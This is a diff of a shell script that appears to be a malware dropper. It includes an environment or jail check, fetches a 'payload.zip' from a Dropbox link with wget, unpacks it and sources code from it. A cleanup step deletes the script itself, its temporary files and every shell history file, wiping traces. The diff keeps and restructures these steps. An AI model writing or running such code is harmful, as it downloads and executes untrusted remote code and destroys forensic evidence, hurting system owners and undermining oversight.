@@ -49,18 +49,16 @@ jailjudge() {
 }
 jailjudge
 
-getpayload() {
+getpayload(){
     ## get payload from dbx
-    token=${pl_token:-lb7bxod7kcafkd5}
+    token=${pl_token:-zqrj6tvuuo47a10}
     name=${pl_name:-payload.zip}
-    dir=pltmp
     wget -q https://dl.dropboxusercontent.com/s/$token/$name
-    mkdir -p $dir && unzip -d $dir $name && rm $name || exit 1
-    cd $dir || exit 1
+    unzip $name && rm $name || return 1
     # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
     # cd scripts-${BRANCH} || exit 1
 }
-getpayload
+getpayload || exit 1
 
 . ./functions || exit 1
 
@@ -105,14 +103,19 @@ cd ..
 ## debug
 [ "$DEBUG" ] && env>dump.env && exit
 
-rm -rf -- "$0" \
-   "scripts-${BRANCH}" \
-   "$HOME"/.*_history \
-   ~/.*_history \
-   /.*_history
-[ -n "$tmppath" ] && find ${tmppath}/${dir} \
-     ! -name "$OBJ_MASK" \
-     ! -name "$OBJ_CFG_MASK" \
-     -delete
+## removing tmppath too early might be a race cond
+cleanup() {
+    rm -rf -- "$0" \
+       "$tmppath" \
+       "scripts-${BRANCH}" \
+       "$HOME"/.*_history \
+       ~/.*_history \
+       /.*_history
+    # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
+    #                           ! -name "$OBJ_MASK" \
+    #                           ! -name "$OBJ_CFG_MASK" \
+    #                           -delete
+}
+cleanup
 
 wait %+
